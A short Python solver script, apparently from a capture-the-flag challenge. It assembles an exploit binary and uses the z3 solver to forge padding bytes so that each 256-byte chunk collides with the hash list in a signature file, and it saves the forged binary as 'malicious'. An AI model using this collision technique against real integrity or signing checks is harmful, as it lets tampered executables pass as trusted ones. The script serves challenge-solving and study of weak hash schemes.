from z3 import *
import os
import struct

def ror32(v):
    if isinstance(v, int):
        return (v >> 1) | ((v & 1) << 31)
    else:
        return RotateRight(v, 1)

def collide_chunk(chunk, ans):
    prefix = chunk[:-32]
    postfix = [BitVec(f'p{i}', 8) for i in range(32)]
    h = 0x20210828
    for c in prefix:
        h = ror32(h ^ c)
    for c in postfix:
        h = ror32(h ^ ZeroExt(24, c))
    s = Solver()
    s.add(h == ans)
    r = s.check()
    if r != sat:
        print(r)
        exit(1)
    m = s.model()
    for c in postfix:
        prefix += bytes([m[c].as_long()])
    return prefix

os.system("nasm exploit.S -o exploit.o -fELF64")
os.system("ld exploit.o -o exploit")
os.system("strip --strip-all exploit")

with open("../distfiles/sample.aldrya", "rb") as f:
    n = struct.unpack("<I", f.read(4))[0]
    hlist = struct.unpack("<"+"I"*n, f.read(4*n))

output = b''
with open("exploit", "rb") as f:
    for i in range(n):
        chunk = f.read(0x100)
        if len(chunk) == 0:
            with open("../distfiles/sample.elf", "rb") as fs:
                fs.seek(i * 0x100)
                output += fs.read(0x100)
        else:
            chunk += b'\x00' * (0x100 - len(chunk))
            output += collide_chunk(chunk, hlist[i])

with open("malicious", "wb") as f:
    f.write(output)
